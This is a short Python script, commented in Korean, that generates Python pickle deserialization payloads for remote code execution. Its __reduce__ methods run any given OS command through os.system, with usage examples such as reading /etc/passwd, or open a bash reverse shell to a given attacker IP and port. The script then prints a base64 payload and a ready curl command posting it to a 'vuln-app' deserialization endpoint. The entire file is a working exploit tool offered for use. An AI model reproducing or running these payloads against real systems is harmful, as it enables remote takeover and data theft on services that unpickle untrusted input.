#!/usr/bin/env python3
"""
Pickle RCE 페이로드 생성기
Usage:
  python3 pickle_payload.py --cmd "id"
  python3 pickle_payload.py --cmd "cat /etc/passwd"
  python3 pickle_payload.py --rev "attacker_ip:4444"   # 리버스 쉘
"""
import pickle, base64, os, argparse

class CmdPayload:
    def __init__(self, cmd): self.cmd = cmd
    def __reduce__(self): return (os.system, (self.cmd,))

class RevShell:
    def __init__(self, ip, port): self.ip, self.port = ip, port
    def __reduce__(self):
        cmd = (f"bash -c 'bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1'")
        return (os.system, (cmd,))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Pickle RCE 페이로드 생성")
    parser.add_argument("--cmd", help="실행할 OS 명령")
    parser.add_argument("--rev", help="리버스 쉘 IP:PORT")
    args = parser.parse_args()

    if args.cmd:
        payload = pickle.dumps(CmdPayload(args.cmd))
    elif args.rev:
        ip, port = args.rev.rsplit(":", 1)
        payload = pickle.dumps(RevShell(ip, int(port)))
    else:
        parser.print_help()
        exit(1)

    encoded = base64.b64encode(payload).decode()
    print(f"[+] Base64 페이로드:\n{encoded}")
    print(f"\n[+] curl 명령:\ncurl -X POST http://vuln-app:5000/deser \\\n  --data-urlencode 'data={encoded}'")
